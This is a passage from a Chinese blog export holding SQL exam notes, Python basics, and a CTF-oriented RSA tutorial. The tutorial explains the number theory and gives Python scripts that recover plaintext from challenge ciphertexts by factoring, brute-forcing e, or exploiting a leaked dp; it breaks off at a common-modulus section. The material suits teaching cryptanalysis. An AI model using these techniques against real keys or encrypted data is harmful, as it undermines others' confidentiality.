<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(salary)</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Music&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="分组聚集">分组聚集</h2>
<p>group by</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name, ave(salary) <span class="keyword">as</span> avg_salary</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> dept_name;</span><br></pre></td></tr></table></figure>
<p>查询每个学科的平均工资，每个学科被当作一个分组。</p>
<p>任何没有出现在group by子句中的属性如果出现在select中的话，只能出现在聚集函数内。</p>
<h2 id="having子句">having子句</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name, <span class="built_in">avg</span>(salary) <span class="keyword">as</span> avg_salary</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> dept_name</span><br><span class="line"><span class="keyword">having</span> <span class="built_in">avg</span>(salary) <span class="operator">&gt;</span> <span class="number">42000</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>最先根据from子句计算出一个关系。</p>
<p>如果出现where子句，where子句中的谓词将应用到from子句计算的结果上。</p>
<p>如果出现group by子句，满足where谓词的元组通过group by子句形成分组。</p>
<p>如果出现having子句，不满足having子句谓词的分组将被抛弃。</p>
<p>select子句利用剩下的分组产生出查询结果中的元组。</p>
</blockquote>
<h2 id="嵌套查询">嵌套查询</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> course_id</span><br><span class="line"><span class="keyword">from</span> section</span><br><span class="line"><span class="keyword">where</span> semester <span class="operator">=</span> <span class="string">&#x27;Fall&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2009</span> <span class="keyword">and</span></span><br><span class="line">course_id <span class="keyword">in</span> (<span class="keyword">select</span> course_id</span><br><span class="line">              <span class="keyword">from</span> section</span><br><span class="line">              <span class="keyword">where</span> semester <span class="operator">=</span> <span class="string">&#x27;Spring&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2010</span>);</span><br></pre></td></tr></table></figure>
<h2 id="集合的比较">集合的比较</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name</span><br><span class="line"><span class="keyword">from</span> instructor </span><br><span class="line"><span class="keyword">where</span> salary <span class="operator">&gt;</span> <span class="keyword">some</span>(<span class="keyword">select</span> salary</span><br><span class="line">                   <span class="keyword">from</span> instructor</span><br><span class="line">                   <span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Biology&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>some表示至少比某一个大。</p>
<h2 id="from子查询替代having">from子查询替代having</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name, avg_salary</span><br><span class="line"><span class="keyword">from</span>(<span class="keyword">select</span> dept_name,<span class="built_in">avg</span>(salary) <span class="keyword">as</span> avg_salary</span><br><span class="line">    <span class="keyword">from</span> instructor</span><br><span class="line">    <span class="keyword">group</span> <span class="keyword">by</span> dept name)</span><br><span class="line">    <span class="keyword">as</span> dept_avg(dept_name, avg_salary) # 重命名子查询的结果</span><br><span class="line"><span class="keyword">where</span> avg_salary <span class="operator">&gt;</span> <span class="number">42000</span>;</span><br></pre></td></tr></table></figure>
<h2 id="with子句">with子句</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> max_budget(<span class="keyword">value</span>) <span class="keyword">as</span> </span><br><span class="line">	(<span class="keyword">select</span> <span class="built_in">max</span>(budget)</span><br><span class="line">    <span class="keyword">from</span> department)</span><br><span class="line"><span class="keyword">select</span> budget</span><br><span class="line"><span class="keyword">from</span> department, max_budget</span><br><span class="line"><span class="keyword">where</span> department.budget <span class="operator">=</span> max_budget.value;</span><br></pre></td></tr></table></figure>
<p>with子句定义临时关系max_budget，在随后的查询中使用。</p>
<h2 id="数据库的修改">数据库的修改</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> r</span><br><span class="line"><span class="keyword">where</span> P;</span><br></pre></td></tr></table></figure>
<p>delete只能作用于一个关系。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course</span><br><span class="line">	<span class="keyword">values</span>(<span class="string">&#x27;CS-437&#x27;</span>,<span class="string">&#x27;Database Systems&#x27;</span>, <span class="string">&#x27;Comp. Sci&#x27;</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<p>查询插入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> instructor</span><br><span class="line">	<span class="keyword">select</span> ID, name, dept_name, <span class="number">18000</span></span><br><span class="line">	<span class="keyword">from</span> student</span><br><span class="line">	<span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Music&#x27;</span> <span class="keyword">and</span> tot_cred <span class="operator">&gt;</span> <span class="number">144</span>;</span><br></pre></td></tr></table></figure>
<p>每个音乐系的学分大于144的学生加入教师队伍，工资18000.</p>
<p>更新</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> instructor</span><br><span class="line"><span class="keyword">set</span> salary <span class="operator">=</span> salary<span class="operator">*</span><span class="number">1.05</span></span><br><span class="line"><span class="keyword">where</span> salary <span class="operator">&lt;</span> <span class="number">70000</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>期末复习</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>第一次例会-python基础</title>
    <url>/2022/09/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BE%8B%E4%BC%9A-python%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="python基础">python基础</h1>
<h2 id="基础语法与规则">1.基础语法与规则</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello world&#x27;</span>) <span class="comment">#单引号</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>) <span class="comment">#双引号</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>) <span class="comment">#输入</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>可以看出，在打印字符串时，使用单引号和双引号结果相同。那为什么要同时支持单引号和双引号呢？尝试输出 Let's go!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Let&#x27;</span>s go!<span class="string">&#x27;) # 报错</span></span><br><span class="line"><span class="string">print(&quot;Let&#x27;</span>s go!<span class="string">&quot;) #正常运行</span></span><br><span class="line"><span class="string">print(&#x27;Let\&#x27;s go!&#x27;) #转义后正常运行</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">多行注释，使用单引号</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">多行注释，使用双引号</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>学习 Python 与其他语言最大的区别就是，Python 的代码块不使用大括号 {} 来控制类，函数以及其他逻辑判断。python 最具特色的就是用缩进来写模块。缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">False</span>) <span class="comment">#正常执行</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="literal">False</span>) <span class="comment">#报错</span></span><br><span class="line">一个代码块内用一个缩进，</span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="literal">False</span>) <span class="comment">#可执行</span></span><br></pre></td></tr></table></figure>
<p>python是一门面向对象的解释型语言，不需要在运行前编译，所以python运算速度比c较为缓慢。</p>
<h3 id="python保留字">python保留字</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line"><span class="built_in">print</span>(keyword.kwlist)</span><br></pre></td></tr></table></figure>
<h3 id="多行语句与单行执行">多行语句与单行执行</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = <span class="number">3</span></span><br><span class="line">total = a + \</span><br><span class="line">b + \</span><br><span class="line">c</span><br><span class="line"><span class="built_in">print</span>(total)</span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span>;b = <span class="number">2</span>;c = <span class="number">3</span></span><br><span class="line">total = a + b + c</span><br><span class="line"><span class="built_in">print</span>(total)</span><br></pre></td></tr></table></figure>
<h3 id="变量赋值">变量赋值</h3>
<p>python与c不同，python赋值并不需要预先定义，也不需要指定变量的数据类型，解释器会自行判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span> <span class="comment">#int</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line">a = <span class="string">&#x27;123&#x27;</span> <span class="comment">#string</span></span><br><span class="line">a = b = c = d = <span class="number">1</span> <span class="comment">#连续赋值</span></span><br><span class="line">a, b = <span class="number">1</span>, <span class="string">&#x27;string&#x27;</span> <span class="comment">#解包赋值</span></span><br></pre></td></tr></table></figure>
<h2 id="基本数据类型">2.基本数据类型</h2>
<p>python基本数据类型：数字，字符串，列表，元组，集合，字典</p>
<h3 id="数值">数值</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(a.bit_length())</span><br><span class="line"><span class="built_in">print</span>(a.__abs__())</span><br><span class="line"><span class="built_in">print</span>(a.__add__(<span class="number">23</span>))</span><br><span class="line"><span class="number">2</span> / <span class="number">4</span> <span class="comment">#小数除</span></span><br><span class="line"><span class="number">2</span> // <span class="number">4</span> <span class="comment">#整数除</span></span><br><span class="line"><span class="number">17</span> % <span class="number">4</span> <span class="comment">#取模</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">3</span> <span class="comment">#求幂</span></span><br><span class="line"><span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="comment">#求模幂</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串">字符串</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(c[<span class="number">1</span>:<span class="number">3</span>]) <span class="comment">#字符串切片 包括1不包括3</span></span><br><span class="line"><span class="built_in">print</span>(c[<span class="number">4</span>]) <span class="comment">#字符串索引</span></span><br><span class="line"><span class="built_in">print</span>(c[-<span class="number">1</span>]) <span class="comment">#从后往前索引，最后一个字符为-1</span></span><br><span class="line"><span class="built_in">print</span>(c[-<span class="number">3</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(c[:<span class="number">3</span>]) <span class="comment">#从头开始</span></span><br><span class="line"><span class="built_in">print</span>(c[<span class="number">3</span>:]) <span class="comment">#到尾结束</span></span><br></pre></td></tr></table></figure>
<h4 id="字符串运算">字符串运算</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a + b)</span><br><span class="line"><span class="built_in">print</span>(a * <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我叫 %s 今年 %d 岁!&quot;</span> % (<span class="string">&#x27;小明&#x27;</span>, <span class="number">10</span>)) <span class="comment"># 格式化字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;我叫<span class="subst">&#123;a&#125;</span>今年<span class="subst">&#123;b&#125;</span>岁&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="内建函数">内建函数</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = a.join(<span class="string">&#x27;~~~~&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a.strip(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a.lstrip(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a.rstrip(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a.replace(<span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;-&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h3 id="类型转换">类型转换</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">123</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(a), <span class="number">16</span>)) <span class="comment">#可以指定进制</span></span><br></pre></td></tr></table></figure>
<h2 id="列表">3.列表</h2>
<p>列表相当于c的数组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>] <span class="comment">#创建列表</span></span><br><span class="line">a.append(<span class="number">6</span>) <span class="comment">#添加元素</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">del</span> a[<span class="number">3</span>] <span class="comment">#删除元素</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = [a, a, a] <span class="comment">#列表嵌套（二维数组）</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(b[<span class="number">1</span>][<span class="number">3</span>])</span><br></pre></td></tr></table></figure>
<h2 id="import">4.import</h2>
<p>python里面最重要的就是各种各样的包，学会导包python就会了一半</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<p>同目录import</p>
]]></content>
      <categories>
        <category>例会</category>
      </categories>
  </entry>
  <entry>
    <title>螺丝网安工作室第二次例会：RSA</title>
    <url>/2022/06/01/%E8%9E%BA%E4%B8%9D%E7%BD%91%E5%AE%89%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BE%8B%E4%BC%9A%EF%BC%9ARSA/</url>
    <content><![CDATA[<h1 id="rsa介绍">RSA介绍</h1>
<h2 id="数学基础">数学基础</h2>
<p>RSA算法是现今使用最广泛的公钥密码算法，也是号称地球上最安全的加密算法。</p>
<h3 id="模运算与同余式">模运算与同余式</h3>
<p>两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b mod m；例如：26 ≡ 14 mod 12。</p>
<span id="more"></span>
<h3 id="互质关系">互质关系</h3>
<p>如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。</p>
<h3 id="欧拉函数">欧拉函数</h3>
<p>φ(n)的值表示小于等于n的正整数之中，有多少个数与n构成互质关系。</p>
<ol type="1">
<li>如果n=1，则 φ(1) = 1 。因为1与任何数都构成互质关系。</li>
<li>如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。</li>
<li>如果n是质数的某次方，即 n = p^k (p为质数，k为大于等于1的整数)，则 <span class="math display">\[ φ(p^k) = p^k-p^{k-1}=p^k*(1-\frac{1}{p}) \]</span> 因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p<sup>(k-1)个，即1×p、2×p、3×p、…、p</sup>(k-1)×p，把它们去除，剩下的就是与n互质的数。</li>
<li>如果n可以分解成两个互质的整数之积，即n = p1 × p2，则φ(n) = φ(p1p2) = φ(p1)φ(p2)。</li>
</ol>
<h3 id="欧拉定理">欧拉定理</h3>
<p>如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立： <span class="math display">\[ a^{φ(n)}≡1 mod n \]</span> 当n为质数时，欧拉定理可以化为： <span class="math display">\[ a^{n-1}≡1 mod n \]</span> 这就是费马小定理，它是欧拉定理的特例。</p>
<h3 id="模反元素">模反元素</h3>
<p>当ab ≡ 1 mod n时，称b为a的模反元素，也称b为a在模n域下的逆。</p>
<h2 id="rsa公私钥生成">RSA公私钥生成</h2>
<ol type="1">
<li>加密者随机选择两个足够大的质数p和q（实际中通常选择512位）。</li>
<li>计算n = p*q。</li>
<li>计算φ(n) = (p-1)*(q-1)。</li>
<li>随机选择一个小于φ(n)且与φ(n)互质的e。</li>
<li>计算e在模n下的逆d，即e*d ≡ 1 mod φ(n)。</li>
<li>(n, e)封装为公钥，(p, q, d)封装为私钥。</li>
</ol>
<p>至此所有数据计算完成。</p>
<h2 id="加密与解密">加密与解密</h2>
<ol type="1">
<li>将密文转码为十六进制数据m。</li>
<li>c ≡ m^e mod n，c 即为密文。</li>
<li>m ≡ c^d mod n。</li>
</ol>
<h2 id="解密算法证明">解密算法证明</h2>
<p><span class="math display">\[  m^{φ(n)}≡1 modn\ m^{kφ(n)+1}≡m modn\ m^{ed}≡ c^d≡ m modn \]</span></p>
<h2 id="各种题型介绍">各种题型介绍</h2>
<h3 id="已知nec直接分解">已知n,e,c（直接分解）</h3>
<blockquote>
<p>n = 5221752478228507746817749923851271656160818214576859501288944132584319293315684653488045907979899837193635911723726962945029941498626499202969421505409311</p>
</blockquote>
<blockquote>
<p>c = 3508639296102512450759730723246544089341766434632407076573093985251751867216058996957915991315405129764052410967805084651073059790045344575535583118277973</p>
</blockquote>
<blockquote>
<p>e = 65537</p>
</blockquote>
<p>在线分解大整数：<a href="https://security.feishu.cn/link/safety?target=http://www.factordb.com/&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">http://www.factordb.com/</a></p>
<p>本地分解：yafu</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">5221752478228507746817749923851271656160818214576859501288944132584319293315684653488045907979899837193635911723726962945029941498626499202969421505409311</span></span><br><span class="line">p = <span class="number">72261694404632581565900073275105451175333931206466294424742649423557055375657</span></span><br><span class="line">q = <span class="number">72261694404632581565900073275105451175333931206466294424742649423557055375623</span></span><br><span class="line">c = <span class="number">3508639296102512450759730723246544089341766434632407076573093985251751867216058996957915991315405129764052410967805084651073059790045344575535583118277973</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> n == p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>
<h3 id="已知ncpq爆破e">已知n,c,p,q(爆破e)</h3>
<blockquote>
<p>n = 117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127 c = 41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128 p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line">c = <span class="number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span></span><br><span class="line">p = <span class="number">139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183</span></span><br><span class="line">q = <span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(e):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d = invert(e, phi)</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">            flag = <span class="built_in">str</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;CTF&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(e, <span class="string">&#x27;\n&#x27;</span>, flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h3 id="已知necdpdp-d-modp-1">已知n,e,c,dp(dp ≡ d mod(p-1))</h3>
<blockquote>
<p>e = 65537 n = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847 c = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869 dp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</p>
</blockquote>
<p>数学推导 $$ 已知dp ≡ d mod (p-1), e*d ≡ 1 mod(p-1)(q-1).<br>
</p>
<p>可得edp ≡ ed mod(p-1).<br>
</p>
<p>展开可得ed = edp +k_1(p-1) = 1 + k_2(p-1)(q-1).<br>
</p>
<p>dp &lt; p-1, e&gt; k_2*(q-1)-k_1. $$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span></span><br><span class="line">c = <span class="number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span></span><br><span class="line">dp = <span class="number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (e * dp - <span class="number">1</span>) % i == <span class="number">0</span> <span class="keyword">and</span> n % ((e * dp - <span class="number">1</span>) // i + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">        q = n // ((e * dp - <span class="number">1</span>) // i + <span class="number">1</span>)</span><br><span class="line">        phi = (q - <span class="number">1</span>) * ((e * dp - <span class="number">1</span>) // i)</span><br><span class="line">        d = gmpy2.invert(e, phi)</span><br><span class="line">        m = gmpy2.powmod(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="提取公钥flag信息">提取公钥/flag信息</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">path = <span class="string">r&#x27;C:\public.key&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e = %d&#x27;</span> % key.e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % key.n)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">tmp = <span class="built_in">int</span>.from_bytes(f, byteorder=<span class="string">&#x27;big&#x27;</span>)  <span class="comment"># 高位存储</span></span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure>
<p>在线工具：<a href="https://security.feishu.cn/link/safety?target=http://www.hiencode.com/pub_asys.html&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">http://www.hiencode.com/pub_asys.html</a> 解析公钥</p>
<h3 id="共模攻击">共模攻击</h3>
<blockquote>
<p>n = 22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</p>
</blockquote>
<blockquote>
